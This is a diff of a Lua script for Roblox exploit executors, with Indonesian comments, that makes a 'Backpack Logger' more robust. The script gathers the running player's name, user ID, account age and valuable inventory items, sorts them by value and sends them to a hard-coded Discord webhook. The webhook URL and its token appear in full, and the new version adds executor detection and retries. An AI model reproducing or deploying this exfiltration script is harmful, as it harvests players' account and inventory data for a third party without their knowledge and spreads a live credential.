@@ -1,127 +1,147 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 
--- Improved number parsing that handles malformed inputs
-local function safeParseNumber(str, default)
-    if type(str) == "number" then return str end
-    if type(str) ~= "string" then return default end
-    
-    -- Extract first number found in string (handles cases like "0.0t KG")
-    local numStr = string.match(str, "[%d%.]+") or ""
-    local num = tonumber(numStr) or default
-    return num
-end
+-- 1. FUNGSI UTAMA YANG DIPERBAIKI
+local function sendBackpackToDiscord()
+    -- Fungsi untuk parsing angka yang aman
+    local function safeParseNumber(str, default)
+        if type(str) == "number" then return str end
+        if type(str) ~= "string" then return default end
+        local numStr = string.match(str, "[%d%.]+") or ""
+        return tonumber(numStr) or default
+    end
 
--- Number formatting with commas
-local function formatNumberWithCommas(n)
-    local num = math.floor(safeParseNumber(n, 0))
-    return tostring(num):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
-end
+    -- Format angka dengan koma
+    local function formatNumberWithCommas(n)
+        local num = math.floor(safeParseNumber(n, 0))
+        return tostring(num):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
+    end
 
-local player = Players.LocalPlayer
-local userId = player.UserId
-local playerName = player.Name
-local accountAge = player.AccountAge
-local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
+    -- 2. DATA PLAYER
+    local player = Players.LocalPlayer
+    local success, userId = pcall(function() return player.UserId end)
+    if not success then userId = 0 end
+    
+    local playerName = player.Name
+    local accountAge = player.AccountAge
+    local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
 
--- Backpack collection with robust error handling
-local backpack = player:WaitForChild("Backpack")
-local backpackItems = {}
-for _, item in ipairs(backpack:GetChildren()) do
-    -- Safely get all attributes
-    local rawWeight = item:GetAttribute("Weight") or "0"
-    local rawAge = item:GetAttribute("Age") or "1"
-    local rawValue = item:GetAttribute("Value") or "0"
+    -- 3. PROSES BACKPACK DENGAN ERROR HANDLING
+    local backpackItems = {}
+    local backpackSuccess, backpack = pcall(function() return player:WaitForChild("Backpack", 5) end)
     
-    -- Parse numbers safely
-    local weight = safeParseNumber(rawWeight, 0)
-    local age = safeParseNumber(rawAge, 1)
-    local value = safeParseNumber(rawValue, 0)
+    if backpackSuccess and backpack then
+        for _, item in ipairs(backpack:GetChildren()) do
+            local success, itemData = pcall(function()
+                local weight = safeParseNumber(item:GetAttribute("Weight"), 0)
+                local age = safeParseNumber(item:GetAttribute("Age"), 1)
+                local value = safeParseNumber(item:GetAttribute("Value"), 0)
+                
+                local itemName = item.Name
+                if item:GetAttribute("IsCelestial") then
+                    itemName = "[Celestial] " .. itemName
+                end
+                
+                return {
+                    text = string.format("%s [%.2f KG] [Age %d] → %s#", 
+                        itemName, weight, age, formatNumberWithCommas(value)),
+                    value = value
+                }
+            end)
+            
+            if success and itemData then
+                table.insert(backpackItems, itemData)
+            end
+        end
+    end
+
+    -- 4. SORTING DAN FORMATTING
+    table.sort(backpackItems, function(a, b) return a.value > b.value end)
     
-    -- Clean weight display (remove any non-numeric characters)
-    local cleanWeight = string.format("%.2f", weight):gsub("[^%d%.]", "")
-    
-    -- Format the item display
-    local itemName = item.Name
-    if item:GetAttribute("IsCelestial") then
-        itemName = "[Celestial] " .. itemName
+    local backpackDisplay = {}
+    for _, item in ipairs(backpackItems) do
+        table.insert(backpackDisplay, item.text)
     end
     
-    -- Handle special item states (like [Wet, Shocked])
-    local states = {}
-    if item:GetAttribute("Wet") then table.insert(states, "Wet") end
-    if item:GetAttribute("Shocked") then table.insert(states, "Shocked") end
+    local backpackStr = #backpackDisplay > 0 and table.concat(backpackDisplay, "\n") or "Kosong"
+    backpackStr = string.sub(backpackStr, 1, 3000) -- Batasi karakter
+
+    -- 5. WEBHOOK REQUEST YANG LEBIH TAHAN BANTING
+    local webhookUrl = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
     
-    local statePrefix = #states > 0 and "["..table.concat(states, ", ").."] " or ""
+    -- Deteksi executor yang tersedia
+    local requestFunc
+    local executors = {
+        syn = syn and syn.request,
+        fluxus = fluxus and fluxus.request,
+        krnl = krnl and krnl.request,
+        http = http_request or request
+    }
     
-    table.insert(backpackItems, {
-        text = string.format("%s%s [%.2f KG] [Age %d] → %s#", 
-            statePrefix, itemName, weight, age, formatNumberWithCommas(value)),
-        value = value
-    })
-end
+    for _, func in pairs(executors) do
+        if type(func) == "function" then
+            requestFunc = func
+            break
+        end
+    end
 
--- Sort by value descending
-table.sort(backpackItems, function(a, b)
-    return a.value > b.value
-end)
+    if not requestFunc then
+        warn("Tidak ditemukan fungsi request yang didukung")
+        return false
+    end
 
--- Prepare final display
-local backpackDisplay = {}
-for _, item in ipairs(backpackItems) do
-    table.insert(backpackDisplay, item.text)
-end
+    -- 6. PREPARASI PAYLOAD
+    local embed = {
+        title = "📦 Informasi Backpack",
+        color = 0x3498db,
+        fields = {
+            {name = "👤 Player", value = string.format("`%s` (ID: `%d`)", playerName, userId), inline = true},
+            {name = "⏳ Umur Akun", value = string.format("%d hari", accountAge), inline = true},
+            {name = "🎒 Isi Backpack", value = "```\n" .. backpackStr .. "\n```", inline = false}
+        },
+        footer = {text = "Backpack Logger - " .. os.date("%X")},
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
 
-local backpackStr = #backpackDisplay > 0 and table.concat(backpackDisplay, "\n") or "Kosong"
+    -- 7. KIRIM REQUEST DENGAN RETRY
+    local function sendRequest(payload)
+        for i = 1, 3 do -- Coba 3 kali
+            local response
+            local success, err = pcall(function()
+                response = requestFunc({
+                    Url = webhookUrl,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = HttpService:JSONEncode(payload)
+                })
+            end)
+            
+            if success and response and (response.StatusCode == 200 or response.StatusCode == 204) then
+                return true
+            end
+            wait(2) -- Tunggu 2 detik sebelum retry
+        end
+        return false
+    end
 
--- Discord webhook setup (unchanged from previous version)
-local webhookUrl = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
-
--- Select request function based on executor
-local requestFunction = (syn and syn.request) or (fluxus and fluxus.request) or 
-                       (krnl and krnl.request) or (http_request or request)
-
-if not requestFunction then
-    warn("❌ Executor tidak mendukung HTTP request.")
-    return
-end
-
-local function safeRequest(options)
-    local success, result = pcall(requestFunction, options)
-    return success and result or nil
-end
-
--- Create Discord embed
-local embed = {
-    title = "📦 Informasi Backpack dan Akun",
-    color = 0x3498db,
-    fields = {
-        {name = "👤 Player", value = string.format("`%s` (ID: `%d`)", playerName, userId), inline = true},
-        {name = "⏳ Umur Akun", value = string.format("%d hari", accountAge), inline = true},
-        {name = "🔗 Profile Roblox", value = string.format("[Klik Disini](%s)", profileUrl), inline = false},
-        {name = "🎒 Isi Backpack", value = "```\n" .. backpackStr .. "\n```", inline = false}
-    },
-    footer = {
-        text = "Backpack Logger - " .. os.date("%Y-%m-%d %H:%M:%S"),
-        icon_url = "https://i.imgur.com/Z4VbQXz.png"
-    },
-    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-}
-
--- Send to Discord
-local response = safeRequest({
-    Url = webhookUrl,
-    Method = "POST",
-    Headers = {["Content-Type"] = "application/json"},
-    Body = HttpService:JSONEncode({
+    -- 8. EKSEKUSI FINAL
+    local success = sendRequest({
         username = "🎒 Backpack Logger",
         avatar_url = "https://i.imgur.com/0y0F0Gj.png",
         embeds = {embed}
     })
-})
 
-if response and (response.StatusCode == 204 or response.StatusCode == 200) then
-    print("✅ Webhook Discord berhasil dikirim!")
-else
-    warn("❌ Gagal mengirim webhook:", response and response.StatusCode or "No response")
+    if success then
+        print("✅ Berhasil mengirim ke webhook!")
+        return true
+    else
+        warn("❌ Gagal mengirim setelah 3 percobaan")
+        return false
+    end
+end
+
+-- Jalankan fungsi utama
+local success = sendBackpackToDiscord()
+if not success then
+    warn("Proses pengiriman webhook mengalami kegagalan total")
 end
